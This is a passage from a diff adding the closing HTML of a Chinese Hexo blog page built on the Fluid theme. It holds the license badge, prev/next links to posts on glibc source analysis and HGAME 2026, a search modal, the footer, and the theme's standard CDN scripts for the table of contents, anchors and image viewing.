+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/22/glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="glibc源码分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">glibc源码分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/22/HGAME%202026/" title="HGAME 2026">
+                        <span class="hidden-mobile">HGAME 2026</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
